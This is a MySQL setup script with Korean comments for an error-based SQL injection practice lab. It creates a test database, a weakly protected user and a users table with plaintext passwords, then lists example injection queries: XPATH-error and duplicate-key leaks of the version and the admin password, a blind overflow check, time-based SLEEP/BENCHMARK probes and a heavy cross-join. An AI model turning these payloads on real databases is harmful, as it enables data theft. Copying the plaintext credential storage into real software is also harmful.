-- Error based SQL Injection 실습용 SQL 스크립트

-- 데이터베이스 및 사용자 생성 (테스트 환경에서 실행 권장)
CREATE DATABASE IF NOT EXISTS dreamhack;
USE dreamhack;

-- 사용자 생성 및 권한 부여
CREATE USER IF NOT EXISTS 'dream'@'localhost' IDENTIFIED BY 'hack';
GRANT ALL PRIVILEGES ON dreamhack.* TO 'dream'@'localhost';
FLUSH PRIVILEGES;

-- users 테이블 생성
DROP TABLE IF EXISTS users;
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL,
  password VARCHAR(100) NOT NULL
);

-- 예시 데이터 삽입
INSERT INTO users (username, password) VALUES
('admin', 'Th1s_1s_admin_PASSW@rd'),
('user1', 'user1pass'),
('user2', 'user2pass');

-- Error based SQLI 테스트용 쿼리 예시
-- 아래 쿼리들은 에러 메시지를 통해 DB 정보를 노출시키기 위한 예시입니다.

-- XPATH 에러를 유도하여 MySQL 버전 노출
SELECT extractvalue(1, concat(0x3a, version()));

-- 관리자 비밀번호 노출
SELECT extractvalue(1, concat(0x3a, (SELECT password FROM users WHERE username='admin')));

-- 그룹화로 인한 Duplicate 에러 발생
SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;

-- Blind SQLI 에러 유도
SELECT IF(1=1, 9e307*2, 0);
SELECT IF(1=0, 9e307*2, 0);

-- Time based SQLI 테스트
SELECT IF(1=1, SLEEP(2), 0);
SELECT BENCHMARK(5000000, SHA1(1));

-- 헤비 쿼리 예시
SELECT (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
